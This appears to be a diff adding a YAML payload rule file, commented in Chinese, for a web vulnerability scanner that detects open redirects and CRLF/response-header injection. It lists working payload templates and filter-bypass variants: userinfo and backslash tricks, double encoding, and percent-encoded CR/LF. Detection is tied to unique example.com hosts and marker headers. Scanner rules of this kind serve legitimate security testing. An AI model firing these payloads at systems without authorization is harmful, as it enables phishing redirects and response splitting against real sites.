@@ -1,0 +1,70 @@
+# 开放重定向 + CRLF/响应头注入规则库。
+#
+# 插件名使用短名 redir，报告里的 technique 会区分：
+# - 开放重定向：确认响应会把浏览器带到我们生成的唯一 example.com 子域。
+# - 响应头注入：确认响应头里出现我们注入的唯一 X-Pass-Scan-* 头。
+#
+# 检测目标是“覆盖面广、通用型强、误报低”：
+# - 开放重定向不跟随跳转，只看响应 Location/Refresh/meta refresh 是否指向唯一外部 host。
+# - CRLF 不靠页面反射，只认真实响应头里出现自定义 header。
+# - 常见绕过直接并进 payload；extra 在 full_payload_scan 或 deep_tamper 时追加。
+
+# ---------------------------------------------------------------------------
+# 开放重定向 payload。
+# {host} 是唯一外部 host，例如 psrabc123.example.com。
+# {marker} 是唯一标记。
+# {target_url} 是 https://{host}/{marker}。
+# {allow} 是当前目标站 hostname，用于弱白名单绕过。
+# ---------------------------------------------------------------------------
+redirect_payloads:
+  # 绝对 URL：最常见 redirect_url/next/return_to sink。
+  - { name: https_full,       template: 'https://{host}/{marker}' }
+  # 协议相对：绕过只过滤 http:// / https:// 的逻辑。
+  - { name: scheme_relative,  template: '//{host}/{marker}' }
+  # userinfo 白名单绕过：真实 host 是 @ 后面的 {host}，{allow} 只出现在 userinfo。
+  - { name: userinfo_allow,   template: 'https://{allow}@{host}/{marker}' }
+  # 目标 host 出现在路径/片段：绕过“URL 字符串包含本站域名”这种弱校验。
+  - { name: allow_in_path,    template: 'https://{host}/{allow}/{marker}' }
+  - { name: allow_in_fragment,template: 'https://{host}/{marker}#{allow}' }
+  # 一次 URL 编码：覆盖服务端先校验原字符串、后解码跳转的常见链路。
+  - { name: encoded_full,     template: 'https%3a%2f%2f{host}%2f{marker}' }
+
+redirect_payloads_extra:
+  # 大写 scheme：绕过大小写敏感的黑名单过滤。
+  - { name: upper_scheme,      template: 'HTTPS://{host}/{marker}' }
+  # 双重编码：覆盖“校验时解码一次，使用时解码两次”的链路。
+  - { name: double_encoded,    template: 'https%253a%252f%252f{host}%252f{marker}' }
+  # 反斜杠：部分浏览器/框架会把 \ 当 / 归一化。
+  - { name: backslash_netloc,  template: '\\{host}\{marker}' }
+  - { name: encoded_backslash, template: '%5c%5c{host}%5c{marker}' }
+  # 子域包含本站域名：绕过 endswith/contains 写错的白名单。
+  - { name: allow_subdomain,   template: 'https://{allow}.{host}/{marker}' }
+  # 参数拼接场景：有的后端把参数再拼进 URL 查询里。
+  - { name: nested_next,       template: 'https://{host}/{marker}?next=https://{allow}/' }
+
+# ---------------------------------------------------------------------------
+# CRLF / 响应头注入 payload。
+# 判定只看响应里是否出现 {header_name}: {header_value}。
+# {value} 是参数原值，{target_url} 是一个合法 URL 形态，适合 Location sink。
+# {crlf}/{lf}/{cr} 在 rules.py 中渲染成真实控制字符；查询/表单会被编码成 %0D%0A，
+# JSON 则会作为字符串控制字符进入后端解析结果。
+# ---------------------------------------------------------------------------
+crlf_payloads:
+  # Location/URL sink：合法 URL 后拼 CRLF。
+  - { name: url_literal_crlf,  template: '{target_url}{crlf}{header_name}: {header_value}' }
+  # 保留参数原值，适配 filename/content-disposition 等非 URL 头部 sink。
+  - { name: value_literal_crlf,template: '{value}{crlf}{header_name}: {header_value}' }
+  # 百分号编码：很多框架会对 query/form 解码后写入响应头。
+  - { name: url_pct_crlf,      template: '{target_url}%0d%0a{header_name}: {header_value}' }
+  - { name: value_pct_crlf,    template: '{value}%0d%0a{header_name}: {header_value}' }
+  # LF-only：兼容只过滤 \r 或错误按 \n 分行的实现。
+  - { name: url_lf_only,       template: '{target_url}%0a{header_name}: {header_value}' }
+
+crlf_payloads_extra:
+  # 大小写/双编码/单独 CR：覆盖更脆的自定义解码链。
+  - { name: url_pct_upper,     template: '{target_url}%0D%0A{header_name}: {header_value}' }
+  - { name: url_double_pct,    template: '{target_url}%250d%250a{header_name}: {header_value}' }
+  - { name: value_double_pct,  template: '{value}%250d%250a{header_name}: {header_value}' }
+  - { name: url_cr_only,       template: '{target_url}%0d{header_name}: {header_value}' }
+  # 老式 %u 解码器。
+  - { name: url_unicode_crlf,  template: '{target_url}%u000d%u000a{header_name}: {header_value}' }
